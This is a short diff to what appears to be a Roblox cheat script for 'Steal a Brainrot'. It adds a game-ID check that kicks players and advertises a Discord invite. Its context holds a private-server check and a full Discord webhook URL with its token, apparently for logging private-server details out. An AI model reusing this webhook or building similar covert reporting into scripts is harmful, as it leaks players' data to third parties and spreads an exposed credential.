@@ -52,6 +52,14 @@ if serverType ~= "VIPServer" then
 end
 
 --====================================================================--
+-- Game ID Check - Steal a Brainrot Only
+--====================================================================--
+if game.PlaceId ~= 109983668079237 then
+    LocalPlayer:Kick("This script only works on Steal a Brainrot.\nJoin via: discord.gg/cnUAk7uc3n")
+    return
+end
+
+--====================================================================--
 -- WEBHOOKS
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
